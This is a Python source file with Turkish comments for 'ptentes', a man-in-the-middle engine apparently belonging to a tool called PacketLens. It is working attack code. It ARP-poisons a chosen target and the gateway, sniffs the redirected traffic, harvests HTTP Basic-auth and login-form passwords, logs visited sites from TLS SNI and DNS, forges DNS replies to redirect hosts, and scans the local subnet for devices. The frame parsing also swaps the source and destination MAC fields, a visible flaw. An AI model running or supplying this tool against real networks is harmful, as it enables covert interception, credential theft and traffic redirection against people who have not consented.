#!/usr/bin/env python3
"""ptentes - PacketLens araya girme (MITM) motoru.

Hedef cihaz ile ağ geçidi arasına ARP sahteciliği ile girilir; trafik
çekirdek yönlendirmesiyle akmaya devam ederken motor bağlantıları izler:

  * ARP zehirleme (çift yönlü, periyodik yenileme, durunca geri alma)
  * Şifresiz HTTP istekleri: Host, yol, User-Agent, Basic auth ve form alanları
  * TLS ClientHello içinden SNI (hangi siteye gidildiği)
  * DNS sorguları ve isteğe bağlı DNS yanıtı yönlendirme (host -> IP)
  * Cihaz keşfi (yerel alt ağda ARP taraması)

Yalnızca Linux'ta çalışır (AF_PACKET) ve root yetkisi ister. Tüm durum
değişiklikleri geri alınır: durdurulduğunda ARP tablosu ve ip_forward eski
hâline döner.
"""
import atexit
import ipaddress
import os
import re
import socket
import struct
import sys
import threading
import time
from urllib.parse import parse_qs, unquote_plus

ETH_IP = 0x0800
ETH_ARP = 0x0806
UDP = 17
TCP = 6
PACKET_MR_PROMISC = 1

MAX_EVENTS = 1500
MAX_CREDS = 400
MAX_DNS = 2000
MAX_HOSTS = 500


def _read(path, default=''):
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError:
        return default


def _ioctl_addr(name, req):
    try:
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            r = fcntl.ioctl(s.fileno(), req, struct.pack('256s', name[:15].encode()))
        finally:
            s.close()
        return socket.inet_ntoa(r[20:24])
    except Exception:
        return ''


def iface_info(name):
    return {
        'name': name,
        'mac': _read('/sys/class/net/%s/address' % name).lower(),
        'ip': _ioctl_addr(name, 0x8915),
        'mask': _ioctl_addr(name, 0x891b),
    }


def default_gateway():
    for line in _read('/proc/net/route').split('\n')[1:]:
        f = line.split()
        if len(f) > 3 and f[1] == '00000000' and int(f[3], 16) & 2:
            try:
                ip = socket.inet_ntoa(struct.pack('<I', int(f[2], 16)))
            except Exception:
                ip = ''
            return f[0], ip
    return '', ''


def arp_table():
    out = {}
    for line in _read('/proc/net/arp').split('\n')[1:]:
        f = line.split()
        if len(f) >= 4 and f[3] != '00:00:00:00:00:00':
            out[f[0]] = f[3].lower()
    return out


def mac_bytes(mac):
    try:
        return bytes(int(x, 16) for x in mac.split(':'))
    except Exception:
        return b'\x00' * 6


def mac_str(raw):
    return ':'.join('%02x' % b for b in raw)


def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


# ---------------------------------------------------------------- çerçeveler
def eth_header(dst, src, etype):
    return dst + src + struct.pack('!H', etype)


def ipv4_header(src, dst, proto, payload_len, ttl=64):
    total = 20 + payload_len
    hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total, 0, 0, ttl, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    return hdr[:10] + struct.pack('!H', checksum(hdr)) + hdr[12:]


def udp_header(src_ip, dst_ip, sport, dport, payload):
    length = 8 + len(payload)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack('!BBH', 0, UDP, length)
    hdr = struct.pack('!HHHH', sport, dport, length, 0)
    c = checksum(pseudo + hdr + payload)
    return struct.pack('!HHHH', sport, dport, length, c or 0xffff)


def arp_reply(eth_dst, spoof_mac, spoof_ip, target_mac, target_ip):
    body = struct.pack('!HHBBH', 1, ETH_IP, 6, 4, 2)
    body += spoof_mac + socket.inet_aton(spoof_ip) + target_mac + socket.inet_aton(target_ip)
    return eth_header(eth_dst, spoof_mac, ETH_ARP) + body


def arp_request(eth_dst, src_mac, src_ip, target_ip):
    body = struct.pack('!HHBBH', 1, ETH_IP, 6, 4, 1)
    body += src_mac + socket.inet_aton(src_ip) + b'\x00' * 6 + socket.inet_aton(target_ip)
    return eth_header(eth_dst, src_mac, ETH_ARP) + body


# ---------------------------------------------------------------- DNS
def dns_parse(pkt):
    """(txid, flags, ad, qtype, soru_sonu) döndürür; paket DNS değilse None."""
    if len(pkt) < 12:
        return None
    txid, flags, qd, an, ns, ar = struct.unpack('!HHHHHH', pkt[:12])
    if qd < 1:
        return None
    off, labels = 12, []
    for _ in range(64):
        if off >= len(pkt):
            return None
        ln = pkt[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:
            return None
        labels.append(pkt[off + 1:off + 1 + ln].decode('latin1', 'replace'))
        off += 1 + ln
    if off + 4 > len(pkt):
        return None
    qtype, qclass = struct.unpack('!HH', pkt[off:off + 4])
    return txid, flags, '.'.join(labels), qtype, off + 4


def dns_answer(query, ip):
    parsed = dns_parse(query)
    if not parsed:
        return None
    txid, _flags, _name, qtype, end = parsed
    if qtype not in (1, 255):
        return None
    header = struct.pack('!HHHHHH', txid, 0x8180, 1, 1, 0, 0)
    ans = b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 45, 4) + socket.inet_aton(ip)
    return header + query[12:end] + ans


# ---------------------------------------------------------------- HTTP / TLS
REQ_RE = re.compile(r'^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT)\s+(\S+)\s+HTTP/\d', re.I)
USER_KEYS = ('user', 'username', 'login', 'email', 'mail', 'kullanici', 'kullanıcı')
PASS_KEYS = ('pass', 'password', 'pwd', 'parola', 'sifre', 'şifre')


def parse_http(payload):
    text = payload.decode('latin1', 'replace')
    m = REQ_RE.match(text)
    if not m:
        return None
    head, _, body = text.partition('\r\n\r\n')
    lines = head.split('\r\n')
    headers, path = {}, ''
    parts = lines[0].split(' ')
    if len(parts) >= 2:
        path = parts[1]
    for ln in lines[1:]:
        if ':' in ln:
            k, v = ln.split(':', 1)
            headers[k.strip().lower()] = v.strip()
    return {'method': m.group(1).upper(), 'path': path, 'headers': headers, 'body': body}


def http_credentials(req):
    """İstekten (kullanıcı, parola) çıkarır."""
    out = []
    auth = req['headers'].get('authorization', '')
    if auth.lower().startswith('basic '):
        try:
            import base64
            raw = base64.b64decode(auth.split(None, 1)[1] + '===').decode('utf-8', 'replace')
            if ':' in raw:
                out.append(('Basic auth', raw.split(':', 1)[0], raw.split(':', 1)[1]))
        except Exception:
            pass
    body = req['body']
    ctype = req['headers'].get('content-type', '')
    if body and ('application/x-www-form-urlencoded' in ctype or '=' in body):
        try:
            fields = parse_qs(body[:8192], keep_blank_values=True)
        except Exception:
            fields = {}
        user = passwd = ''
        for k in fields:
            lk = k.lower()
            if not user and any(lk == u or lk.startswith(u) for u in USER_KEYS):
                user = unquote_plus(fields[k][0])[:200]
            if not passwd and any(lk == p or lk.startswith(p) for p in PASS_KEYS):
                passwd = unquote_plus(fields[k][0])[:200]
        if user or passwd:
            out.append(('Form', user, passwd))
    return out


def tls_sni(payload):
    try:
        if len(payload) < 44 or payload[0] != 0x16 or payload[5] != 0x01:
            return None
        rec = struct.unpack('!H', payload[3:5])[0]
        q = payload[5:5 + rec]
        if len(q) < 4 or q[0] != 1:
            return None
        o = 4 + 2 + 32
        sid = q[o]
        o += 1 + sid
        cs = struct.unpack('!H', q[o:o + 2])[0]
        o += 2 + cs
        cm = q[o]
        o += 1 + cm
        ext_len = struct.unpack('!H', q[o:o + 2])[0]
        o += 2
        end = min(len(q), o + ext_len)
        while o + 4 <= end:
            etype, elen = struct.unpack('!HH', q[o:o + 4])
            o += 4
            if etype == 0 and o + elen <= len(q):
                e = q[o:o + elen]
                if len(e) >= 5:
                    nlen = struct.unpack('!H', e[3:5])[0]
                    return e[5:5 + nlen].decode('latin1', 'replace')
            o += elen
    except Exception:
        return None
    return None


# ---------------------------------------------------------------- motor
class Ptentes:
    """Araya girme oturumunun tamamını yöneten tekil motor."""

    def __init__(self):
        self.lock = threading.RLock()
        self._reset()
        atexit.register(self.stop)

    def _reset(self):
        self.running = False
        self.error = None
        self.iface = ''
        self.target = ''
        self.gateway = ''
        self.target_mac = ''
        self.gateway_mac = ''
        self.my_mac = ''
        self.my_ip = ''
        self.spoof_dns = True
        self.forward = True
        self.dns_map = {}
        self.started = 0.0
        self.events = []
        self.creds = []
        self.dns_log = []
        self.hosts = {}
        self.stats = {'packets': 0, 'bytes': 0, 'http': 0, 'tls': 0, 'dns': 0,
                      'spoofed': 0, 'creds': 0, 'arp': 0}
        self.threads = []
        self.stop_ev = threading.Event()
        self._sock = None
        self._send = None
        self._ip_forward_prev = None
        self._ident = 0

    # ------------------------------------------------------------ yardımcı
    def _ident_next(self):
        self._ident = (self._ident + 1) & 0xffff
        return self._ident

    def _learn(self, ip, mac=''):
        if not ip or ip.startswith('127.'):
            return
        with self.lock:
            h = self.hosts.get(ip)
            if not h:
                if len(self.hosts) >= MAX_HOSTS:
                    return
                h = {'ip': ip, 'mac': mac, 'first': time.time(), 'last': time.time(),
                     'packets': 0, 'bytes': 0}
                self.hosts[ip] = h
            if mac:
                h['mac'] = mac
            h['last'] = time.time()

    def _event(self, kind, src, dst, detail, sev='info'):
        with self.lock:
            self.events.append({'t': round(time.time(), 3), 'kind': kind, 'src': src,
                                'dst': dst, 'detail': detail, 'sev': sev})
            if len(self.events) > MAX_EVENTS:
                del self.events[:500]

    def _add_cred(self, host, proto, user, passwd):
        with self.lock:
            for c in self.creds:
                if c['host'] == host and c['proto'] == proto and c['user'] == user and c['pass'] == passwd:
                    c['t'] = round(time.time(), 3)
                    return
            if len(self.creds) >= MAX_CREDS:
                del self.creds[:100]
            self.creds.append({'t': round(time.time(), 3), 'host': host, 'proto': proto,
                               'user': user, 'pass': passwd})
            self.stats['creds'] += 1

    def _dns_target(self, host):
        host = host.lower().rstrip('.')
        if host in self.dns_map:
            return self.dns_map[host]
        for pat, ip in self.dns_map.items():
            if pat.startswith('*.') and host.endswith(pat[1:]):
                return ip
        return None

    # ------------------------------------------------------------ başlat
    def start(self, cfg):
        with self.lock:
            if self.running:
                return {'ok': False, 'error': 'ptentes zaten çalışıyor.'}
            if not sys.platform.startswith('linux'):
                return {'ok': False, 'error': 'ptentes yalnızca Linux üzerinde çalışır (AF_PACKET gerekli).'}
            if os.geteuid() != 0:
                return {'ok': False, 'error': 'ARP zehirleme için root gerekir: sudo python3 packetlens.py'}

            iface = (cfg.get('iface') or '').strip()
            target = (cfg.get('target') or '').strip()
            if not iface or not target:
                return {'ok': False, 'error': 'Arayüz ve hedef IP zorunlu.'}
            try:
                ipaddress.IPv4Address(target)
            except Exception:
                return {'ok': False, 'error': 'Geçersiz hedef IP: %s' % target}

            info = iface_info(iface)
            if not info['mac'] or not info['ip']:
                return {'ok': False, 'error': 'Arayüz bilgisi okunamadı: %s' % iface}
            if not info['mask']:
                info['mask'] = '255.255.255.0'

            try:
                net = ipaddress.IPv4Network('%s/%s' % (info['ip'], info['mask']), strict=False)
            except Exception:
                return {'ok': False, 'error': 'Alt ağ hesaplanamadı.'}
            if ipaddress.IPv4Address(target) not in net:
                return {'ok': False, 'error': 'Hedef %s, %s ağında değil (%s).' % (target, net, info['ip'])}

            gw_ip = (cfg.get('gateway') or '').strip()
            if not gw_ip:
                gw_if, gw_ip = default_gateway()
                if not gw_ip:
                    return {'ok': False, 'error': 'Ağ geçidi bulunamadı; elle girin.'}
            try:
                ipaddress.IPv4Address(gw_ip)
            except Exception:
                return {'ok': False, 'error': 'Geçersiz ağ geçidi: %s' % gw_ip}
            if gw_ip == target:
                return {'ok': False, 'error': 'Hedef ile ağ geçidi aynı olamaz.'}
            if gw_ip in (info['ip'], target):
                return {'ok': False, 'error': 'Ağ geçidi bu makine ya da hedefin kendisi.'}

            self._reset()
            self.iface, self.target, self.gateway = iface, target, gw_ip
            self.my_mac, self.my_ip = info['mac'], info['ip']
            self.spoof_dns = bool(cfg.get('dns_spoof', True))
            self.forward = bool(cfg.get('forward', True))
            self.dns_map = {str(k).lower().rstrip('.'): str(v) for k, v in (cfg.get('dns_map') or {}).items()
                            if str(k).strip() and _valid_ip(str(v))}

            try:
                self._sock = self._open_socket(iface)
                self._send = self._open_socket(iface)
            except PermissionError:
                self._close()
                return {'ok': False, 'error': 'Ham soket açılamadı: root gerekir.'}
            except OSError as e:
                self._close()
                return {'ok': False, 'error': 'Arayüz açılamadı: %s' % e}

            self.target_mac = self._resolve_mac(target, info['mac'], info['ip'])
            self.gateway_mac = self._resolve_mac(gw_ip, info['mac'], info['ip'])
            if not self.target_mac:
                self._close()
                return {'ok': False, 'error': 'Hedefin MAC adresi bulunamadı: %s' % target}
            if not self.gateway_mac:
                self._close()
                return {'ok': False, 'error': 'Ağ geçidinin MAC adresi bulunamadı: %s' % gw_ip}

            if self.forward:
                self._ip_forward_prev = _read('/proc/sys/net/ipv4/ip_forward', '0')
                self._write('/proc/sys/net/ipv4/ip_forward', '1')

            self.stop_ev.clear()
            self.running = True
            self.started = time.time()
            self._event('start', target, gw_ip, 'ARP zehirleme başladı (%s üzerinden)' % iface, 'ok')
            for fn in (self._arp_loop, self._sniff_loop):
                t = threading.Thread(target=fn, daemon=True)
                t.start()
                self.threads.append(t)
            return {'ok': True, 'target_mac': self.target_mac, 'gateway_mac': self.gateway_mac}

    def _open_socket(self, iface):
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        s.bind((iface, 0))
        try:
            s.setsockopt(263, PACKET_MR_PROMISC,
                         struct.pack('iHH8s', socket.if_nametoindex(iface), 1, 0, b'\0' * 8))
        except OSError:
            pass
        s.settimeout(0.3)
        return s

    @staticmethod
    def _write(path, val):
        try:
            with open(path, 'w') as f:
                f.write(val)
            return True
        except OSError:
            return False

    def _resolve_mac(self, ip, my_mac, my_ip, timeout=2.0):
        mac = arp_table().get(ip)
        if mac:
            return mac
        req = arp_request(b'\xff' * 6, mac_bytes(my_mac), my_ip, ip)
        for _ in range(4):
            try:
                self._send.send(req)
            except OSError:
                pass
            time.sleep(0.35)
            mac = arp_table().get(ip)
            if mac:
                return mac
        return ''

    # ------------------------------------------------------------ ARP döngüsü
    def _arp_loop(self):
        tmac, gmac = mac_bytes(self.target_mac), mac_bytes(self.gateway_mac)
        mymac = mac_bytes(self.my_mac)
        while not self.stop_ev.is_set():
            try:
                # hedefe: "ağ geçidi benim" · ağ geçidine: "hedef benim"
                self._send.send(arp_reply(tmac, mymac, self.gateway, tmac, self.target))
                self._send.send(arp_reply(gmac, mymac, self.target, gmac, self.gateway))
                with self.lock:
                    self.stats['arp'] += 2
            except OSError:
                pass
            self.stop_ev.wait(1.8)

    # ------------------------------------------------------------ dinleme
    def _sniff_loop(self):
        while not self.stop_ev.is_set():
            try:
                frame, _addr = self._sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(frame)
            except Exception:
                # Bozuk/eksik bir çerçeve motoru durdurmasın.
                continue

    def _handle(self, frame):
        if len(frame) < 14:
            return
        src_mac, dst_mac = frame[0:6], frame[6:12]
        etype = struct.unpack('!H', frame[12:14])[0]

        if etype == ETH_ARP:
            if len(frame) >= 42:
                op = struct.unpack('!H', frame[20:22])[0]
                if op in (1, 2):
                    spa = socket.inet_ntoa(frame[28:32])
                    self._learn(spa, mac_str(frame[22:28]))
            return
        if etype != ETH_IP:
            return

        p = frame[14:]
        if len(p) < 20 or (p[0] >> 4) != 4:
            return
        ihl = (p[0] & 15) * 4
        total = struct.unpack('!H', p[2:4])[0]
        proto = p[9]
        frag = struct.unpack('!H', p[6:8])[0]
        if frag & 0x1FFF:
            return
        src_ip = socket.inet_ntoa(p[12:16])
        dst_ip = socket.inet_ntoa(p[16:20])
        seg = p[ihl:min(total, len(p))]
        self._learn(src_ip, mac_str(src_mac))

        with self.lock:
            self.stats['packets'] += 1
            self.stats['bytes'] += len(frame)
            h = self.hosts.get(src_ip)
            if h:
                h['packets'] += 1
                h['bytes'] += len(frame)

        if proto == UDP and len(seg) >= 8:
            sport, dport, ulen = struct.unpack('!HHH', seg[:6])
            payload = seg[8:min(ulen, len(seg))]
            if dport == 53 or sport == 53:
                self._dns(src_ip, dst_ip, sport, dport, payload, mac_str(src_mac))
        elif proto == TCP and len(seg) >= 20:
            sport, dport, off_flags = struct.unpack('!HHI', seg[:8])
            doff = (off_flags >> 12) * 4
            payload = seg[doff:]
            if not payload:
                return
            if 80 in (sport, dport) or 8080 in (sport, dport):
                self._http(src_ip, dst_ip, sport, dport, payload)
            elif 443 in (sport, dport) and dport == 443:
                name = tls_sni(payload)
                if name:
                    with self.lock:
                        self.stats['tls'] += 1
                    self._event('tls', src_ip, name, 'TLS bağlantısı: %s' % name)
                    self._learn(name, '')

    def _dns(self, src_ip, dst_ip, sport, dport, payload, src_mac):
        parsed = dns_parse(payload)
        if not parsed:
            return
        txid, flags, name, qtype, _end = parsed
        if flags & 0x8000:
            return  # yanıt
        if not name:
            return
        with self.lock:
            self.stats['dns'] += 1
            self.dns_log.append({'t': round(time.time(), 3), 'client': src_ip, 'name': name,
                                 'qtype': qtype, 'spoofed': False})
            if len(self.dns_log) > MAX_DNS:
                del self.dns_log[:500]

        target_ip = self._dns_target(name) if self.spoof_dns else None
        if target_ip and dport == 53:
            ans = dns_answer(payload, target_ip)
            if ans:
                frame = eth_header(mac_bytes(src_mac), mac_bytes(self.my_mac), ETH_IP)
                frame += ipv4_header(dst_ip, src_ip, UDP, 8 + len(ans))
                frame += udp_header(dst_ip, src_ip, 53, sport, ans)
                try:
                    self._send.send(frame)
                    with self.lock:
                        self.stats['spoofed'] += 1
                        if self.dns_log:
                            self.dns_log[-1]['spoofed'] = True
                            self.dns_log[-1]['answer'] = target_ip
                    self._event('dns-spoof', src_ip, name, '%s -> %s' % (name, target_ip), 'warn')
                except OSError:
                    pass
        else:
            self._event('dns', src_ip, name, name, 'info')

    def _http(self, src_ip, dst_ip, sport, dport, payload):
        req = parse_http(payload)
        if not req:
            return
        host = req['headers'].get('host', dst_ip)
        with self.lock:
            self.stats['http'] += 1
        self._event('http', src_ip, host, '%s %s%s' % (req['method'], host, req['path']), 'info')
        for proto, user, passwd in http_credentials(req):
            self._add_cred(host, proto, user, passwd)
            self._event('cred', src_ip, host, '%s kimlik bilgisi: %s' % (proto, user or '—'), 'bad')

    # ------------------------------------------------------------ durum
    def status(self):
        with self.lock:
            return {
                'running': self.running,
                'error': self.error,
                'iface': self.iface,
                'target': self.target,
                'gateway': self.gateway,
                'target_mac': self.target_mac,
                'gateway_mac': self.gateway_mac,
                'my_mac': self.my_mac,
                'my_ip': self.my_ip,
                'dns_spoof': self.spoof_dns,
                'forward': self.forward,
                'dns_map': self.dns_map,
                'started': self.started,
                'uptime': round(time.time() - self.started, 1) if self.started else 0,
                'stats': dict(self.stats),
                'events': list(self.events),
                'creds': list(self.creds),
                'dns': list(self.dns_log),
                'hosts': sorted(self.hosts.values(), key=lambda h: h['last'], reverse=True),
                'platform': sys.platform,
                'root': os.geteuid() == 0,
            }

    def set_dns_map(self, mapping):
        with self.lock:
            self.dns_map = {str(k).lower().rstrip('.'): str(v) for k, v in (mapping or {}).items()
                            if str(k).strip() and _valid_ip(str(v))}
            return dict(self.dns_map)

    def report(self):
        st = self.status()
        return {'tool': 'ptentes', 'generated': time.time(), 'session': st}

    # ------------------------------------------------------------ durdur
    def stop(self):
        with self.lock:
            was_running = self.running
            self.running = False
            self.stop_ev.set()
        for t in list(self.threads):
            t.join(timeout=1.5)
        self.threads = []
        if was_running and self._send and self.target_mac and self.gateway_mac:
            # Doğru eşlemeleri geri gönder: ağ sessizce eski hâline dönsün.
            try:
                tmac, gmac = mac_bytes(self.target_mac), mac_bytes(self.gateway_mac)
                for _ in range(5):
                    self._send.send(arp_reply(tmac, gmac, self.gateway, tmac, self.target))
                    self._send.send(arp_reply(gmac, tmac, self.target, gmac, self.gateway))
                    time.sleep(0.15)
            except OSError:
                pass
            self._event('stop', self.target, self.gateway, 'ARP tablosu geri alındı', 'ok')
        if self._ip_forward_prev is not None:
            self._write('/proc/sys/net/ipv4/ip_forward', self._ip_forward_prev)
            self._ip_forward_prev = None
        self._close()
        return {'ok': True}

    def _close(self):
        for s in (self._sock, self._send):
            try:
                if s:
                    s.close()
            except OSError:
                pass
        self._sock = self._send = None

    # ------------------------------------------------------------ keşif
    def discover(self, iface, wait=1.6, limit=512):
        if not sys.platform.startswith('linux') or os.geteuid() != 0:
            return {'ok': False, 'error': 'Keşif için Linux ve root gerekir.'}
        info = iface_info(iface)
        if not info['mac'] or not info['ip']:
            return {'ok': False, 'error': 'Arayüz bilgisi okunamadı.'}
        try:
            net = ipaddress.IPv4Network('%s/%s' % (info['ip'], info['mask'] or '255.255.255.0'), strict=False)
        except Exception:
            return {'ok': False, 'error': 'Alt ağ hesaplanamadı.'}
        try:
            sock = self._open_socket(iface)
        except OSError as e:
            return {'ok': False, 'error': 'Soket açılamadı: %s' % e}
        try:
            hosts = [str(h) for h in net.hosts()][:limit]
            for _ in range(2):
                for ip in hosts:
                    try:
                        sock.send(arp_request(b'\xff' * 6, mac_bytes(info['mac']), info['ip'], ip))
                    except OSError:
                        break
                time.sleep(wait / 2)
            table = arp_table()
            found = []
            for ip in hosts:
                if ip in table:
                    found.append({'ip': ip, 'mac': table[ip]})
            return {'ok': True, 'subnet': str(net), 'found': found}
        finally:
            try:
                sock.close()
            except OSError:
                pass


def _valid_ip(s):
    try:
        ipaddress.IPv4Address(s)
        return True
    except Exception:
        return False


PT = Ptentes()
